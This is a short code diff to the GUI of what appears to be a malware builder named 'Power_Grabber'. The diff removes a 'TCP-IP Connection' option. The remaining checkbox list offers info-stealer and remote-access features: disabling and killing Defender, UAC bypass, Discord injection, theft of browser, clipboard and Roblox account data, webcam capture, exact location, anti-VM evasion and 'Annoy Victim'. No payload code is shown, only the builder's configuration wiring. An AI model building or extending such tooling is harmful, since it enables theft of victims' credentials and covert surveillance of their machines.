@@ -166,7 +166,7 @@ class Power_Grabber(ctk.CTk):
             'Anti VM', 'Annoy Victim (Audio)', 'Browser Info', 'Clipboard contents',
             'Disable defender (Needs UAC Bypass)', 'Discord Info', 'Discord Injection', 'Exact location',
             'Games info', 'Kill defender (Needs UAC Bypass)', 'Obfuscate', 'Roblox account', 'Self destruction',
-            'Self exclusion', 'TCP-IP Connection', 'Screenshot', 'System info',
+            'Self exclusion', 'Screenshot', 'System info',
             'UAC Bypass', 'Vulnerable port creation', 'Webcam', 'Watch Dog'
         ]
         checkbox_frame = ctk.CTkFrame(page, fg_color='transparent')
@@ -201,7 +201,6 @@ class Power_Grabber(ctk.CTk):
         screenshot_checkbox = checkbox_dict['Screenshot']
         self_destruct_checkbox = checkbox_dict['Self destruction']
         self_exclusion_checkbox = checkbox_dict['Self exclusion']
-        TCP_IP_Connection_checkbox = checkbox_dict['TCP-IP Connection']
         system_info_checkbox = checkbox_dict['System info']
         uac_bypass_checkbox = checkbox_dict['UAC Bypass']
         vulnerable_port_creation_checkbox = checkbox_dict['Vulnerable port creation']
@@ -242,7 +241,6 @@ class Power_Grabber(ctk.CTk):
         "Roblox-Account": bool(roblox_account_checkbox.get()),
         "Self-destruction": bool(self_destruct_checkbox.get()),
         "Self-exclusion": bool(self_exclusion_checkbox.get()),
-        "TCP-IP-Connection": bool(TCP_IP_Connection_checkbox.get()),
         "Screenshot": bool(screenshot_checkbox.get()),
         "System-Info": bool(system_info_checkbox.get()),
         "UAC-Bypass": bool(uac_bypass_checkbox.get()),
@@ -307,4 +305,3 @@ class Power_Grabber(ctk.CTk):
 if __name__ == '__main__':
     app = Power_Grabber()
     app.mainloop()
-    
